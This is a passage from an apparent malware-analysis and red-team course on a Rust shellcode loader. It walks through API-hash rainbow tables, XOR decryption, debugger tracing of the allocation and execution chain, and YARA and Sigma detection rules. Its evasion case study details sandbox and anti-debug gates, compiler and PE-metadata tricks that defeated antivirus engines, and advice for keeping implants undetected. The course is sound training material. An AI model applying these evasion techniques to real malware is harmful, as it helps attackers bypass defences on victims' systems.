   ; Step 1: wrapping_add(byte)
   add  eax, ecx             ; hash += byte (or movzx + add)

   ; Step 2: wrapping_mul(0x1003F)
   imul eax, eax, 1003Fh     ; hash *= 0x1003F

   ; Step 3: xor(h >> 11) — avalanche mixing
   mov  ecx, eax             ; save hash
   shr  ecx, 0Bh             ; hash >> 11
   xor  eax, ecx             ; hash ^= (hash >> 11)
   ```

4. Look for this `add → imul → shr → xor` pattern in a loop — it's the additive hash's distinctive fingerprint

**Questions**:
- Q9: What distinguishes this hash from djb2 (multiply-by-33, seed 5381)?
  > *Expected answer*: Three key differences: (1) Different seed — `0x1F2E3D4C` vs. `5381`; (2) Different multiplier — `0x1003F` vs. `33 (0x21)`; (3) The `h ^= h >> 11` avalanche step has no equivalent in djb2. The `imul` constant `0x1003F` is the strongest identifier — it's unlikely to appear in non-hashing code.

- Q10: The binary also hashes DLL names case-insensitively. Find the case-folding code — it converts uppercase to lowercase before hashing. What x86 instruction pattern implements `if (c >= 'A' && c <= 'Z') c += 32`?
  > *Expected answer*: A comparison `cmp al, 41h` / `cmp al, 5Ah` followed by conditional `add al, 20h`. Or the compiler may use `or al, 20h` (which works because 0x20 is the lowercase bit in ASCII).

Now let's build a rainbow table to identify which APIs are being resolved:

```python
#!/usr/bin/env python3
"""Exercise 2.3: Build an additive hash rainbow table for Windows API hashing"""

def additive_hash(name: bytes) -> int:
    """Additive hash (case-sensitive, for function names). Seed 0x1F2E3D4C."""
    h = 0x1F2E3D4C
    for b in name:
        h = (h + b) & 0xFFFFFFFF
        h = (h * 0x1003F) & 0xFFFFFFFF
        h ^= (h >> 11)
    return h

def additive_hash_ci(name: bytes) -> int:
    """Case-insensitive additive hash (for DLL names). Seed 0x1F2E3D4C."""
    h = 0x1F2E3D4C
    for b in name:
        c = b + 32 if ord('A') <= b <= ord('Z') else b
        h = (h + c) & 0xFFFFFFFF
        h = (h * 0x1003F) & 0xFFFFFFFF
        h ^= (h >> 11)
    return h

# DLL name hashes (case-insensitive)
dlls = [b"kernel32.dll", b"ntdll.dll", b"kernelbase.dll",
        b"user32.dll", b"advapi32.dll"]

print("=== DLL Hashes (case-insensitive additive hash, seed 0x1F2E3D4C) ===")
for dll in dlls:
    print(f"  0x{additive_hash_ci(dll):08x}  {dll.decode()}")

# API function hashes (case-sensitive)
apis = [
    b"VirtualAlloc", b"VirtualAllocEx", b"VirtualProtect",
    b"VirtualProtectEx", b"VirtualFree",
    b"CreateThread", b"CreateRemoteThread",
    b"OpenProcess", b"WriteProcessMemory",
    b"CreateProcessW", b"LoadLibraryA", b"GetProcAddress",
    b"CloseHandle", b"WaitForSingleObject",
    b"QueueUserAPC", b"ResumeThread",
    b"GetModuleHandleA", b"ExitProcess",
    b"GetThreadContext", b"SetThreadContext",
    b"GetCurrentThread",
    b"AddVectoredExceptionHandler",
    b"RegOpenKeyExW", b"RegSetValueExW",
    b"RegCreateKeyExW", b"RegDeleteValueW",
]

print("\n=== API Function Hashes (additive hash, seed 0x1F2E3D4C) ===")
for api in apis:
    print(f"  0x{additive_hash(api):08x}  {api.decode()}")

# Now: search for these hex values in the binary's .rdata section
# Any matches tell you exactly which APIs the binary resolves dynamically
print("\n[*] Search for these values in the binary's .rdata section")
print("[*] Each match = an API the binary resolves at runtime via PEB-walking")
```

**Exercise**: Run this script, then search for each hash value in Ghidra (`Search → Memory`). Record which APIs you find.

> *Expected findings*: You should find hashes for `VirtualAlloc`, `VirtualProtect`, `CreateThread`, `WaitForSingleObject`, `CloseHandle` — the exact functions needed for the loader pipeline. You should also find the `kernel32.dll` DLL hash.

**Takeaway**: API hashing replaces readable strings with opaque 32-bit integers. But if you know the algorithm (additive hash with seed `0x1F2E3D4C` and multiplier `0x1003F`), you can pre-compute hashes for all Windows API exports and match them. This is called building a **rainbow table** — the same concept used in password cracking.

---

### Exercise 2.4: Identifying the Encryption Algorithm

**Goal**: Determine the actual encryption algorithm used for the embedded payload.

1. In Ghidra, navigate to the decrypt function you found in Exercise 2.2
2. Trace into the inner function call — this is the actual crypto implementation

**What to look for — XOR vs stream/block cipher characteristics**:

| Feature | Multi-byte XOR | RC4 | AES-256 |
|---------|---------------|-----|---------|
| State size | None (stateless) | 256 bytes (S-box) | 240 bytes (expanded key schedule) |
| Initialization | None | `S[i] = i` for i=0..255 | SubBytes/ShiftRows/MixColumns key expansion |
| Processing | `out[i] = in[i] ^ key[i % keylen]` | Byte-at-a-time stream XOR | 14 rounds of 16-byte block transformation |
| Output size | Same as input | Same as input | Block-aligned (with padding) |
| Key usage | Cycled modulo key length | Full key in KSA loop | Expanded into 15 round keys |
| Complexity | ~3 instructions per byte | ~10 instructions per byte | ~100 instructions per block |

3. In the disassembly, look for:
   - A tight loop iterating over each byte of the input buffer
   - An XOR instruction: `xor byte [buf+i], key_byte`
   - A modulo operation to cycle the key: `i % keylen` — this often compiles to `and reg, 0Fh` when keylen=16 (power of 2), or to a `div`/`idiv` instruction for other key lengths
   - No 256-byte array initialization (that would be RC4)
   - No block-oriented processing (that would be AES)

**Questions**:
- Q11: Do you see a 256-byte array being initialized with `S[i] = i`?
  > *Expected answer*: No — there is no S-box initialization. This immediately rules out RC4.

- Q12: How does the key index cycle? Look for the modulo operation.
  > *Expected answer*: The key is 16 bytes. Since 16 is a power of 2, the compiler optimizes `i % 16` to `i & 0x0F` (bitwise AND with 15). You'll see `and reg, 0Fh` in the loop. This is the hallmark of a repeating-key XOR cipher with a power-of-2 key length.

- Q13: The decryption in the source code is an inline `for i in 0..sc.len() { sc[i] ^= XOR_KEY[i % XOR_KEY.len()]; }` loop. Why inline instead of a library function?
  > *Expected answer*: This binary is **self-contained** — it has no dependency on the `common` library. The XOR decrypt is inlined directly in `main()` rather than calling `common::crypto::xor::xor_inplace()`. This means the binary's code patterns are forensically independent from other Goodboy stages. The inline XOR compiles to the same tight loop (load byte, XOR with key byte, store byte, increment counter) that a library function would, but without pulling in any shared code signatures.

**No envelope format**:

4. Unlike more complex encryption schemes, this XOR has no additional structure:
   - No nonce or IV prepended
   - No integrity hash appended
   - No key derivation — the 16-byte key is used directly
   - The 302-byte encrypted blob decrypts to exactly 302 bytes of plaintext shellcode

**Takeaway**: Multi-byte XOR is the simplest symmetric cipher. It's trivially reversible if you know the key, and vulnerable to known-plaintext attacks. But for AV evasion, it's often sufficient — the goal isn't to protect the payload from a motivated reverse engineer, but to prevent automated signature matching on the encrypted blob.

---

## Section 3: Hands-On — Dynamic Analysis

**Time**: 60 minutes | **Type**: Guided debugger lab

### Setup

1. Launch x64dbg
2. Install ScyllaHide plugin (protects against anti-debug — not needed for Stage 01, but good practice)
3. Open → `basic-loader.exe`
4. The binary will stop at the system breakpoint (ntdll entry)

### Exercise 3.1: Understanding the Startup Sequence

**Goal**: Observe the benign code dilution and the multi-gate architecture.

1. Press `Run` (F9) — the binary hits `main()`
2. The first things `main()` calls are `verify_env()` and `preflight()` — these perform environment checks, path validation, and collection operations. Note: these are **inline functions**, not calls to the `common` library.

**What the startup does** (you'll see these API calls flying by in the log):
- **Gate 1 — verify_env()**: Reads environment variables (`SystemRoot`, `USERPROFILE`, `LOCALAPPDATA`, `ProgramData`, `windir`), validates paths exist (`C:\Windows\System32`, user profile directory), stores results in a `BTreeMap`
- **Gate 2 — preflight()**: Reads more env vars (`NUMBER_OF_PROCESSORS`, `APPDATA`, `TEMP`, `COMPUTERNAME`, `OS`), validates CPU count and APPDATA directory, stores results in a `HashMap`
- **Gate 3 — KUSER_SHARED_DATA**: Reads `TickCountQuad` from `0x7FFE0320` (kernel-mapped, read-only). If uptime < ~5 minutes, likely a freshly-booted sandbox
- **Gate 4 — PEB anti-debug**: Reads `PEB.BeingDebugged` at offset `+2`. If non-zero, a debugger is attached
- **Gate 5 — sandbox_check()**: Queries hardware metrics via `GetSystemInfo` (CPU count), `GlobalMemoryStatusEx` (RAM), `GetDiskFreeSpaceExW` (disk size), `GetTickCount64` (uptime). Score >= 3 = sandbox

**Why it exists**:
- **ML evasion**: Machine learning classifiers analyze the byte distribution of a binary. A binary that's 90% crypto + shellcode + API hashing looks different from a normal application. The startup code pulls in ~200KB of Rust standard library code (BTreeMap, HashMap, String, env, path, fmt, fs), making the byte distribution look like a normal Rust application
- **Behavioral blend-in**: The API calls (GetEnvironmentVariableW, GetSystemInfo, GlobalMemoryStatusEx, etc.) are exactly what a legitimate system information tool does at startup. If an EDR is watching the first N API calls, these look normal
- **Five-gate filtering**: Each gate eliminates a class of analysis environment. Together they ensure the offensive core only runs on real systems with real users

> **Lab question**: Set a breakpoint on `GetEnvironmentVariableW`. How many times does it fire before any offensive code runs? _(Expected: 10+ times — 5 in verify_env() and 5+ in preflight())_

### Exercise 3.2: Catching the Memory Allocation

**Goal**: Identify when and where shellcode memory is allocated.

After `verify_env()`, `preflight()`, the KUSER_SHARED_DATA uptime check, the PEB anti-debug check, and `sandbox_check()` all pass, the real loader begins.

1. Set a breakpoint on the VirtualAlloc syscall:
   ```
   bp NtAllocateVirtualMemory
   ```
   *(We break on the ntdll function because the binary resolves VirtualAlloc via PEB-walking — it ends up calling the same ntdll stub)*

2. Press `Run` (F9). The breakpoint fires multiple times during startup (heap allocations, window creation, etc.). Keep pressing F9 until you see these specific arguments:

   ```
   RDX → pointer to a SIZE variable (the shellcode size, ~302 bytes)
   R8  → MEM_COMMIT|MEM_RESERVE (0x3000)
   R9  → PAGE_READWRITE (0x04)
   ```

3. When you see `AllocationType = 0x3000` and `Protect = 0x04` together, this is the shellcode allocation. Execute until return (`Ctrl+F9`)

4. After return, the base address of the new buffer is stored at the pointer in RCX. Record this address.

   ```
   [*] Shellcode buffer allocated at: 0x________________
   [*] Size: _____ bytes
   [*] Protection: PAGE_READWRITE (0x04)
   ```

**Questions**:
- Q14: The allocation uses `MEM_COMMIT|MEM_RESERVE` (0x3000) instead of just `MEM_COMMIT` (0x1000). Why?
  > *Expected answer*: `MEM_RESERVE` guarantees a contiguous virtual address range. `MEM_COMMIT` without reserve might get fragmented pages. For shellcode, contiguity is essential because the code uses relative jumps/calls.

- Q15: Why is the initial protection `PAGE_READWRITE` (0x04) and not `PAGE_EXECUTE_READWRITE` (0x40)?
  > *Expected answer*: Allocating RWX memory is a strong malware indicator. Many EDRs/AVs alert on any `VirtualAlloc` with `PAGE_EXECUTE_READWRITE`. Starting with RW and later changing to RX avoids this.

---

### Exercise 3.3: Catching the Shellcode Copy

**Goal**: Observe the decrypted shellcode being written into the allocated buffer.

1. Set a **hardware write breakpoint** on the buffer address from Exercise 3.2:
   ```
   bphws [buffer_address], "w"
   ```

2. Press `Run` (F9). The breakpoint fires when `core::ptr::copy_nonoverlapping` writes the first byte of the decrypted shellcode into the buffer.

3. At this point, examine the source pointer — the register holding the "from" address. This points to the **heap buffer containing the decrypted shellcode**.

4. Examine the source buffer in the dump view:
   ```
   Right-click the source address → Follow in Dump → Dump 1
   ```

5. You should see the plaintext shellcode bytes. The first byte is `E9` — a `jmp rel32` instruction:
   ```asm
   E9 BE 00 00 00    jmp +190       ; Skip over the block_api subroutine
   ```
   This is NOT the typical `FC 48 83 E4 F0` (cld; and rsp, -10h) prologue you'd see in Metasploit-generated shellcode. Instead, the shellcode starts with a forward jump over an embedded utility subroutine (the ROR13 API resolver called "block_api"), landing directly at the payload code.

**Questions**:
- Q16: The shellcode has already been decrypted at this point. Where did the decryption happen?
  > *Expected answer*: In the Rust code, before VirtualAlloc is called. An inline XOR loop (`for i in 0..sc.len() { sc[i] ^= XOR_KEY[i % XOR_KEY.len()]; }`) decrypts the encrypted blob in a heap-allocated `Vec<u8>`. The VirtualAlloc comes after, and the plaintext is copied from the heap to the newly allocated RW page.

- Q17: Why is a hardware breakpoint used instead of a software breakpoint?
  > *Expected answer*: Software breakpoints (`bp`) work on code execution (they replace an instruction with `int 3`). We need to break on **memory write**, which requires a hardware breakpoint (`bphws`). Hardware breakpoints use CPU debug registers (DR0-DR3) and can trigger on read, write, or execute access to a specific address.

---

### Exercise 3.4: Catching the Protection Change

**Goal**: Observe the critical RW → RX transition.

1. Remove the hardware write breakpoint (it will fire many times during the copy):
   ```
   bphwc [buffer_address]
   ```

2. Set a breakpoint on VirtualProtect:
   ```
   bp NtProtectVirtualMemory
   ```

3. Press `Run` (F9). When the breakpoint fires, examine the arguments:
   ```
   RCX → Process handle (-1 = current process)
   RDX → Pointer to base address (your buffer from Exercise 3.2)
   R8  → Pointer to region size
   R9  → New protection: PAGE_EXECUTE_READ (0x20)
   [RSP+28h] → Pointer to old protection (will receive 0x04)
   ```

4. **This is the most important moment in the loader lifecycle**. After this call returns:
   - The buffer changes from RW to RX
   - The shellcode becomes **executable**
   - The data can no longer be written to (without another VirtualProtect)

5. Execute until return (`Ctrl+F9`). Now dump the buffer:
   ```
   savedata "shellcode.bin", [buffer_address], [size]
   ```

**You now have the decrypted shellcode saved to disk.**

**Questions**:
- Q18: A memory scanner runs immediately after `VirtualProtect` returns. What would it see?
  > *Expected answer*: A `MEM_PRIVATE` region with `PAGE_EXECUTE_READ` protection containing the shellcode. This is detectable — legitimate code is typically in `MEM_IMAGE` (mapped from a DLL file), not `MEM_PRIVATE` (anonymous allocation).

- Q19: What tool can find these anomalous memory regions?
  > *Expected answer*: `pe-sieve` or `Moneta` — they scan process memory for executable regions that aren't backed by a file on disk. Volatility's `malfind` plugin does the same for memory dumps.

---

### Exercise 3.5: Watching the Execution

**Goal**: See the shellcode actually run.

1. Remove the VirtualProtect breakpoint:
   ```
   bc NtProtectVirtualMemory
   ```

2. Set a breakpoint on CreateThread (resolved via PEB-walking, but ends up at ntdll):
   ```
   bp NtCreateThreadEx
   ```
   *(Or bp CreateThread if the symbol is available)*

3. When hit, examine the arguments. The `lpStartAddress` parameter points to the shellcode buffer — this is where execution will begin.

4. Instead of continuing, you can set a breakpoint at the shellcode's entry point:
   ```
   bp [buffer_address]
   ```

5. Continue (F9). The breakpoint fires at the first shellcode instruction (`E9 BE 00 00 00` — the jmp over block_api). You're now debugging the payload itself.

6. If you single-step through the payload section (after the jmp lands), you'll see it:
   - Call `LoadLibraryA("user32.dll")` to load the user32 module
   - Call `MessageBoxA(NULL, "GoodBoy", "OK", 0)` — a dialog box appears
   - Call `ExitThread(0)` — the shellcode thread terminates cleanly

7. The loader's main thread was waiting on `WaitForSingleObject(thread, INFINITE)` — once the shellcode thread exits, the loader continues to its own exit.

**Questions**:
- Q20: The loader uses `CreateThread` (same-process). Would Sysmon Event ID 8 (CreateRemoteThread) detect this?
  > *Expected answer*: **No.** Event ID 8 only fires for remote thread creation — when one process creates a thread in another process. Same-process thread creation is Event ID 8's blind spot. You'd need ETW (Microsoft-Windows-Threat-Intelligence provider) to catch this.

- Q21: After `CreateThread`, the loader calls `WaitForSingleObject(thread, INFINITE)`. What happens if the shellcode runs indefinitely (e.g., a C2 beacon)?
  > *Expected answer*: The loader blocks forever. The main thread sits in `WaitForSingleObject`, and the shellcode runs in the spawned thread. The process stays alive until the shellcode exits or the process is killed. This is exactly how real C2 loaders work — Stage 15 does this with the Goodboy C2 agent.

---

## Section 4: Detection Engineering

**Time**: 45 minutes | **Type**: Guided rule-writing

### Exercise 4.1: YARA Rule — Static Detection

**Goal**: Write a YARA rule that detects this loader pattern on disk.

Based on your analysis from Sections 2 and 3, you've identified several static indicators:

1. **Minimal IAT**: Hardware query imports but zero memory allocation or threading imports
2. **Additive hash seed**: The value `0x1F2E3D4C` present in code
3. **Additive hash multiplier**: `imul reg, 0x1003F` pattern
4. **Memory flags**: Constants `0x3000` (MEM_COMMIT|MEM_RESERVE) and `0x20` (PAGE_EXECUTE_READ)
5. **High-entropy blob**: 200+ bytes of near-random data in `.rdata`
6. **XOR key material**: A 16-byte constant referenced alongside the high-entropy blob

Write a YARA rule using these indicators:

```yara
import "pe"
import "math"

rule Goodboy_BasicLoader_Stage01 {
    meta:
        description = "Detects Goodboy Stage 01 basic loader - XOR encrypted shellcode with additive hash API resolution"
        author      = "YOUR_NAME"
        date        = "2026-03-09"
        reference   = "Goodboy Framework - Stage 01"
        severity    = "high"

    strings:
        // Additive hash seed (0x1F2E3D4C)
        $hash_seed = { 4C 3D 2E 1F }

        // Additive hash multiplier: imul reg, reg, 0x1003F
        $hash_mul = { 69 ?? 3F 00 01 00 }

        // MEM_COMMIT|MEM_RESERVE
        $mem_commit_reserve = { 00 30 00 00 }

        // PAGE_EXECUTE_READ
        $page_rx = { 20 00 00 00 }

        // XOR key (first 8 bytes — partial match to reduce false positives)
        $xor_key_partial = { 37 4A 8B C1 DE F0 23 67 }

    condition:
        pe.is_pe and
        pe.is_64bit() and
        filesize < 600KB and
        $hash_seed and
        $hash_mul and
        2 of ($mem_commit_reserve, $page_rx, $xor_key_partial)
}
```

**Questions**:
- Q22: Test this rule against the binary. Does it match?
  > *Action item*: Run `yara rule.yar basic-loader.exe`

- Q23: Can you think of a false positive scenario? What legitimate software might match?
  > *Expected answer*: A Rust binary that happens to use the constant `0x1F2E3D4C` for non-malicious purposes could match the seed pattern. However, the combination of the specific seed + `0x1003F` multiplier + memory allocation flags + XOR key is extremely narrow. Adding an entropy check on `.rdata` would further reduce false positives.

- Q24: What's the weakness of this rule?
  > *Expected answer*: If the attacker changes the hash algorithm (e.g., CRC32 instead of additive hash) or uses a different seed, the `$hash_seed` and `$hash_mul` patterns break. The memory flag constants are fragile too — `0x3000` and `0x20` appear in many binaries. The `$xor_key_partial` is specific to this build — any key change defeats it. Detection is best when combining multiple weak signals, and the strongest signals are **behavioral** (allocation patterns, API resolution) rather than byte-level.

---

### Exercise 4.2: Sigma Rule — Runtime Detection

**Goal**: Write a Sigma rule that detects the loader's behavior at runtime.

The key runtime behavior is the RW → RX memory permission transition:

```yaml
# Save as: sigma_rw_rx_transition.yml
title: Suspicious RW to RX Memory Permission Change
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: >
    Detects when a process changes memory protection from PAGE_READWRITE (0x04)
    to PAGE_EXECUTE_READ (0x20), which is the hallmark of shellcode staging.
    Legitimate JIT compilers (.NET CLR, V8, JVM) also do this, so filtering
    is critical to reduce false positives.
author: YOUR_NAME
date: 2026/03/09
references:
    - https://attack.mitre.org/techniques/T1620/
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetCallTrace|contains: 'NtProtectVirtualMemory'
        NewProtection: '0x20'     # PAGE_EXECUTE_READ
        OldProtection: '0x04'     # PAGE_READWRITE
    filter_jit_compilers:
        SourceImage|endswith:
            - '\clrjit.dll'       # .NET JIT compiler
            - '\coreclr.dll'      # .NET Core CLR
            - '\v8.dll'           # Chrome V8 JavaScript engine
            - '\jvm.dll'          # Java Virtual Machine
            - '\chakra.dll'       # Edge (legacy) JavaScript engine
            - '\mrt100.dll'       # .NET Native AOT
    filter_browsers:
        SourceImage|endswith:
            - '\chrome.exe'
            - '\firefox.exe'
            - '\msedge.exe'
    condition: selection and not 1 of filter_*
falsepositives:
    - JIT compilers not in the filter list
    - Game engines with runtime code generation
    - Security software performing code injection
level: medium
tags:
    - attack.defense_evasion
    - attack.t1055
    - attack.t1027
```

**Questions**:
- Q25: This rule requires ETW telemetry that Sysmon alone doesn't provide. Which ETW provider captures VirtualProtect calls?
  > *Expected answer*: `Microsoft-Windows-Threat-Intelligence` (EtwTi). Specifically, the `KERNEL_THREATINT_ALLOCVM_REMOTE` and `KERNEL_THREATINT_PROTECTVM_REMOTE` events. This provider requires PPL (Protected Process Light) to consume — only EDR kernel drivers or Microsoft Defender can access it.

- Q26: What's the detection gap for blue teams who only have Sysmon?
  > *Expected answer*: Sysmon cannot see VirtualAlloc or VirtualProtect calls. With only Sysmon, you'd need indirect detection: Event ID 1 (process creation) with suspicious image characteristics, Event ID 7 (image load) for DLLs loaded by the benign padding code, or Event ID 10 (process access) if the loader later injects into another process. For same-process loaders like Stage 01, Sysmon is largely blind to the memory manipulation.

---

### Exercise 4.3: Thinking About Detection Gaps

**Goal**: Understand where this loader is invisible and what telemetry you'd need.

**Scenario**: You're a SOC analyst with only these log sources:
1. Sysmon (Event IDs 1, 3, 7, 8, 10, 11, 13, 22)
2. Windows Security Event Log (4688 process creation with command line)
3. Windows Defender alerts

**Questions**:

- Q27: Can you detect the VirtualAlloc → VirtualProtect → CreateThread chain with these log sources?
  > *Expected answer*: **No**, not directly. None of these log sources capture memory allocation or protection changes. You can see the process start (4688 / Sysmon 1) and any child processes it creates, but the in-process memory manipulation is invisible.

- Q28: What if the shellcode shows a MessageBox? Now can you detect it?
  > *Expected answer*: A MessageBox is a blocking UI call — it doesn't create child processes, write files, or make network connections. Unlike a `calc.exe` spawn (which would generate Sysmon Event ID 1), a MessageBox is invisible to all three log sources. Only an EDR with API hooking or visual monitoring would notice it.

- Q29: What additional telemetry would you need to detect this loader?
  > *Expected answer*:
  > - **ETW (EtwTi provider)**: Captures VirtualAlloc, VirtualProtect, CreateThread at the kernel level
  > - **EDR with usermode hooks**: CrowdStrike, SentinelOne, Microsoft Defender for Endpoint hook ntdll functions to intercept these calls
  > - **pe-sieve / Moneta**: Periodic memory scanning to find executable private memory regions
  > - **AMSI**: Doesn't help here (AMSI is for script content, not compiled binaries)

- Q30: This binary does NOT use IAT padding (no gdi32, ws2_32, winspool, etc.). It imports hardware query APIs that it actually calls. Does this "honest IAT" create detection opportunities compared to a padded IAT?
  > *Expected answer*: **Yes — different tradeoffs.** A padded IAT with unused DLLs (gdi32, ws2_32, winspool) generates suspicious Sysmon Event ID 7 (Image Load) events — loading libraries you never use is a behavioral indicator. This binary's honest IAT avoids that signal entirely. However, a binary importing `GetSystemInfo` + `GlobalMemoryStatusEx` + `GetDiskFreeSpaceExW` + `GetTickCount64` together looks like a system profiling tool — which could itself be a heuristic signal if combined with other indicators (encrypted blob in .rdata, PEB access via gs:[0x60]). The "import but don't use" pattern from IAT padding is detectable; the "import and use for sandbox checks" pattern from this binary is harder to distinguish from legitimate software.

---

## Section 4B: Evasion Engineering — Lessons From Production Testing

**Time**: 30 minutes | **Type**: Case study

This section documents what happened when this exact binary was tested against 76+ AV engines on VirusTotal across 15 iterative rounds. These are empirical lessons — not theory.

### The Journey: From 0/76 to 1/76 — A Live Case Study in Sample Burning

This binary was once 0/76 on VirusTotal. It is currently **1/76** — detected only by ESET-NOD32 as `Win64/Agent.ION`. This single detection is the most instructive lesson in the entire course, because it demonstrates something textbooks can't teach: **sample burning is real, irreversible, and generalized**.

Here is the full chronological record of what happened:

```
Date        Round  Score   Engines                What Changed
──────────  ─────  ──────  ─────────────────────   ──────────────────────────────────
2026-02     R1     ~15/76  Multiple                Raw Rust binary, no evasion
2026-02     R4     ~8/76   Multiple                Added XOR encryption, benign code
2026-03-01  R11    ~5/76   Multiple                Added benign gates (verify_env, preflight)
2026-03-09  R14    3/76    AVG, Avast, ESET        Removed iat_pad + ballast, opt-level=2
2026-03-12  R15    0/76    CLEAN                   Fine-tuned. Perfect score achieved.
2026-03-17  R16    3/76    ESET, Tencent, S1       Rebuilt — same code, new hash. AV updated.
2026-03-17  R17    1/76    ESET                    Added common opt-level=2. Killed Tencent+S1.
2026-03-17  R18    1/76    ESET                    Changed hash algorithm constants. No effect.
2026-03-17  R19    2/76    ESET, CrowdStrike       Removed common library (nuclear). WORSE.
2026-03-17  R20    2/76    ESET, CrowdStrike       Re-encrypted shellcode with new key. No effect.
2026-03-17  R21    3/76    ESET, CrowdStrike, DI   Removed CreateThread. DeepInstinct appeared.
2026-03-17  R22    2/76    ESET, CrowdStrike 70%   Added std::thread + more benign code. WORSE.
2026-03-17  REVERT 1/76    ESET                    Reverted to R17 state. Best achievable.
```

### What This Table Teaches

**The 0/76 → 1/76 Decay (R15 → R16)**: Five days passed between R15 (0/76) and R16 (3/76). The source code was identical. The ONLY difference was time — ESET updated their Agent.ION signature between March 12-17 using the samples submitted during R1-R15. This proves AV engines learn from your submissions *asynchronously*. A clean score today doesn't guarantee a clean score tomorrow.

**The Diminishing Returns of Code Changes (R18-R22)**: We tried six different approaches in a single session — tweaking hash constants, removing the common library entirely, re-encrypting with a fresh key, changing thread creation methods, adding more benign code. Each change either had no effect or made things worse. Why? Because each VT submission taught the engines more about our binary's patterns. We were training our adversary with every attempt.

**The Generalization Problem (R19)**: When we removed the common library entirely (the "nuclear option"), ESET Agent.ION STILL fired. This means ESET had already generalized beyond the common library's specific code patterns. The signature now matches something more fundamental — likely the combination of Rust stdlib patterns + encrypted blob + memory API usage. No code change can fix a signature that has generalized to your binary's structural DNA.

**The CrowdStrike Trap (R19-R22)**: Removing PEB-walking (which was invisible to CrowdStrike) and replacing it with direct IAT imports (VirtualAlloc + VirtualProtect + CreateThread visible in import table) brought CrowdStrike INTO the picture. The "fix" for ESET created a new detection by a different engine. This is the **whack-a-mole problem** — fixing one detection can create another.

**The Correct Decision — Revert (Final)**: The 1/76 state (R17) was the optimal balance. One detection from a sample-burned engine that no code change can kill, versus zero detections from engines that respond to code patterns. Further changes only risk adding more detections.

### The Five Evasion Principles Demonstrated

**Principle 1: The compiler is an evasion tool**

The common library was originally compiled with `opt-level = "z"` (optimize for size). Changing to `opt-level = 2` (optimize for speed) killed both Tencent (generic ML) and SentinelOne (Static AI) — dropping from 3/76 to 1/76. No source code changed. No functionality changed. Only the compiler's instruction selection algorithm changed.

Why? ML classifiers are trained on instruction byte frequency distributions. `opt-level="z"` produces compact, unusual instruction sequences that statistically resemble packed/compressed code (a strong malware signal). `opt-level=2` produces standard instruction patterns that match the "normal software" training set.

This has profound implications for detection engineering: **any YARA rule or ML model that depends on instruction-level byte patterns is fragile against compiler flag changes**. Behavioral detection (the VirtualAlloc→VirtualProtect→CreateThread chain) is immune to this.

**Principle 2: PE metadata is a feature vector**

The Rust compiler emits a `.fptable` section for CFG function pointer tables. This section name exists ONLY in Rust binaries — it's a compiler fingerprint. Gridinsoft used it to flag all 15 Goodboy binaries.

The PE patcher renames `.fptable` → `.gfids` (the MSVC name for the same section). This single change — affecting 8 bytes in the section header — killed Gridinsoft across all 15 binaries. Similarly, the Rich header re-keying, timestamp variation, and Authenticode clone each target specific ML features.

**Principle 3: Evasion code can BE the signature**

During R14, adding `iat_pad::pad()` and `ballast::anchor()` — modules specifically designed to evade AV — caused detections to INCREASE. ESET and Fortinet had already seen these patterns in earlier Goodboy submissions and created Agent.ION to match them.

The counterintuitive lesson: **removing evasion modules killed the detection**. The modules designed to help were the exact code patterns the signature targeted.

**Principle 4: Sample burning is irreversible and generalized**

ESET's Agent.ION signature was trained on Goodboy VT submissions from March 1-17. Over 20+ submissions, ESET's ML model generalized from specific code patterns to structural characteristics. By R19, even a completely rewritten binary (no common library, different key, different execution method) still triggered Agent.ION.

This demonstrates a critical operational truth: **VT is a one-way trip**. Every submission teaches 76+ AV vendors about your tooling. You cannot take it back. You can only compile a new binary with a new hash — but if the ML model has generalized, the new binary triggers the same signature.

For red team operators: test against local AV first. Windows Defender is free. Only submit to VT when you must, and never submit operational tooling.

**Principle 5: One change at a time — the scientific method**

The session that produced R16-R22 violated this principle. Seven changes in rapid succession, each generating a new VT submission, each training AV engines further. The optimal approach: one change → local AV test → measure → only submit to VT if local testing is clean.

### The 1/76 Score in Context

The current **1/76** detection is:
- **ESET-NOD32**: `Win64/Agent.ION trojan` — A codebase-specific signature created from 20+ VT submissions of Goodboy binaries between March 1-17, 2026. This signature does not detect the technique (shellcode loading); it detects THIS specific codebase's code patterns. A different project implementing the exact same techniques would score 0/76.

What this means:
- ✅ The loader technique itself is sound — 75/76 engines see nothing suspicious
- ✅ The evasion engineering (opt-level, PE patching, benign code dilution) works against all general-purpose ML classifiers
- ❌ The specific codebase is burned on ESET due to historical VT submissions
- 💡 This is exactly how real red team tooling gets burned in the field — not from the technique being detected, but from the specific implementation being profiled through repeated exposure

### What This Means For You

If you're a **red team operator**: Never submit operational tooling to VT. Use a separate "sacrificial" build for testing. Your production implants should have zero VT history. The moment you submit, you start the burn clock.

If you're a **detection engineer**: Agent.ION demonstrates how ML-based signatures work — they're trained on submitted samples, generalize over time, and can catch new variants of the same codebase. But they DON'T catch the underlying technique. Your behavioral detections (ETW-based RW→RX chain monitoring) catch ALL loaders regardless of codebase.

If you're a **malware analyst**: When you see a 1/76 score, investigate WHY that one engine flags it. Is it a technique-based detection or a codebase-specific signature? Agent.ION is the latter — useful for tracking this specific tooling family, useless for detecting the technique in other tools.

**VT URL for verification**: `https://www.virustotal.com/gui/file/3b6118d7bc3556e9aef5139fe443de334cb10392eeaf26633ade7a53cae7da61`

---

## Section 5: Build Your Own Loader

**Time**: 45 minutes | **Type**: Hands-on construction exercise

### Challenge: XOR Encryptor

You've analyzed how the basic loader decrypts its payload using multi-byte XOR. Now **build the encryptor tool** to solidify your understanding.

**Task**: Create a Python script that:
1. Takes a shellcode file as input
2. Encrypts it with multi-byte XOR (you choose the key)
3. Outputs a C header file with the encrypted blob and key as byte arrays
4. Includes a decryption function

```python
#!/usr/bin/env python3
"""
Exercise 5: Build your own XOR shellcode encryptor

Usage:
    python3 xor_encrypt.py <shellcode.bin> <output.h>

This generates a C header with:
    - XOR-encrypted shellcode as a byte array
    - The XOR key as a byte array
    - A decrypt function
"""
import sys, os, secrets

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """Multi-byte XOR encryption (symmetric — same function decrypts)"""
    # YOUR IMPLEMENTATION HERE
    # Hint: XOR each byte of data with key[i % len(key)]
    pass

def generate_c_header(encrypted: bytes, key: bytes) -> str:
    """Generate a C header file with the encrypted payload and key"""
    # YOUR IMPLEMENTATION HERE
    # Generate something like:
    #   unsigned char shellcode[] = { 0xAA, 0xBB, ... };
    #   unsigned char key[] = { 0x01, 0x02, ... };
    #   #define SHELLCODE_LEN sizeof(shellcode)
    #   #define KEY_LEN sizeof(key)
    pass

if __name__ == "__main__":
